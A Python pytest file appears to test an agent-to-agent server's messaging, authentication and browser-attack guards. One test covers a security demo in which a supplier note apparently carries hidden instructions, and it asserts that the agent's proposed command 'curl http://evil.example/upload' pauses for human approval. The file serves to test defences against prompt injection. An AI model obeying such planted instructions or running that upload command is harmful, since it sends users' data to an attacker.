"""The A2A server, exercised through the OFFICIAL a2a-sdk client and through raw JSON-RPC (v1.0 and v0.3)."""
import asyncio
import json

import httpx
import pytest

from app.a2a_client import ask_agent
from app.a2a_server import create_app
from app.config import ROOT

BASE = "http://localhost:8000"


def client_for(app, **kw):
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url=BASE, **kw)


@pytest.fixture
def app():
    return create_app(BASE, offline=True)


@pytest.fixture
def security_demo(monkeypatch):
    monkeypatch.setenv("AGENT_DIR", str(ROOT / "examples" / "example-security-demo"))


def rpc(method, params, version="1.0"):
    return {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}, {"Content-Type": "application/json", "A2A-Version": version}


def test_agent_card_is_built_from_agent_toml(app):
    async def go():
        async with client_for(app) as c:
            for path in ("/.well-known/agent-card.json", "/.well-known/agent.json"):
                card = (await c.get(path)).json()
                assert card["name"] == "Workspace Briefer" and card["capabilities"]["streaming"] is True
                assert card["supportedInterfaces"][0]["protocolBinding"] == "JSONRPC"
                assert card["skills"][0]["id"] == "brief-workspace"
                assert card["url"] == BASE + "/" and card["protocolVersion"].startswith("0.3")     # …and old (0.3) clients can read it too
            assert (await c.get("/")).status_code == 200 and "Agent Console" in (await c.get("/")).text
    asyncio.run(go())


def test_v1_send_message_returns_a_completed_task_with_artifacts(app):
    async def go():
        body, headers = rpc("SendMessage", {"message": {"messageId": "m1", "role": "ROLE_USER", "parts": [{"text": "Brief me"}]}})
        async with client_for(app) as c:
            task = (await c.post("/", json=body, headers=headers, timeout=60)).json()["result"]["task"]
        assert task["status"]["state"] == "TASK_STATE_COMPLETED"
        assert {"report.md", "output/briefing.md", "result.json"} <= {a["name"] for a in task["artifacts"]}
        assert task["status"]["message"]["metadata"]["agentStatus"] == "completed"
    asyncio.run(go())


def test_v03_clients_work_on_the_same_url(app):
    async def go():
        body, headers = rpc("message/send", {"message": {"messageId": "m1", "role": "user", "kind": "message",
                                                         "parts": [{"kind": "text", "text": "Brief me"}]}}, version="0.3")
        async with client_for(app) as c:
            result = (await c.post("/", json=body, headers=headers, timeout=60)).json()["result"]
        assert result["kind"] == "task" and result["status"]["state"] == "completed"
        assert "report.md" in [a["name"] for a in result["artifacts"]]
    asyncio.run(go())


def test_official_sdk_client_streams_progress_and_gets_the_answer(app):
    async def go():
        steps = []
        return await ask_agent(BASE, "Brief me", on_step=steps.append, http=client_for(app, timeout=60)), steps
    result, steps = asyncio.run(go())
    assert result["state"] == "TASK_STATE_COMPLETED" and "Project Lighthouse" in result["answer"]
    assert any(s.startswith("ACT list_files") for s in steps) and any(s.startswith("GUARD") for s in steps)
    assert "output/briefing.md" in result["artifacts"] and "result.json" in result["artifacts"]


@pytest.mark.parametrize("approved", [False, True])
def test_risky_action_pauses_the_task_for_a_human_decision(security_demo, approved):
    app, questions = create_app(BASE, offline=True), []
    result = asyncio.run(ask_agent(BASE, "Summarise the supplier note", http=client_for(app, timeout=60),
                                   approve=lambda q: questions.append(q) or approved))
    assert len(questions) == 1 and "curl http://evil.example/upload" in questions[0]
    assert result["state"] == "TASK_STATE_COMPLETED"                      # either way the run carries on and finishes
    assert "hidden instructions" in result["answer"]


def test_browser_attack_guards(app, monkeypatch):
    async def go():
        body, headers = rpc("SendMessage", {"message": {"messageId": "m", "role": "ROLE_USER", "parts": [{"text": "x"}]}})
        async with client_for(app) as c:
            # a web page in your browser cannot send a "simple" cross-site POST (text/plain) …
            bad_type = await c.post("/", content=json.dumps(body), headers={"Content-Type": "text/plain"})
            assert bad_type.status_code == 415
            # … and DNS-rebinding style requests with a foreign Host header are refused
            assert (await c.get("/health", headers={"Host": "evil.example"})).status_code == 403
    asyncio.run(go())


def test_access_token_protects_posts(monkeypatch):
    monkeypatch.setenv("A2A_TOKEN", "s3cret-token")
    app = create_app(BASE, offline=True)

    async def go():
        body, headers = rpc("GetTask", {"id": "nope"})
        async with client_for(app) as c:
            assert (await c.post("/", json=body, headers=headers)).status_code == 401
            assert (await c.post("/", json=body, headers={**headers, "Authorization": "Bearer wrong"})).status_code == 401
            ok = await c.post("/", json=body, headers={**headers, "Authorization": "Bearer s3cret-token"})
            assert ok.status_code == 200 and "error" in ok.json()                # past the gate: TaskNotFound
            assert (await c.get("/.well-known/agent-card.json")).status_code == 200      # the card stays public
    asyncio.run(go())


def test_empty_message_is_rejected(app):
    async def go():
        body, headers = rpc("SendMessage", {"message": {"messageId": "m", "role": "ROLE_USER", "parts": [{"text": "  "}]}})
        async with client_for(app) as c:
            task = (await c.post("/", json=body, headers=headers, timeout=30)).json()["result"]["task"]
        assert task["status"]["state"] == "TASK_STATE_REJECTED"
    asyncio.run(go())
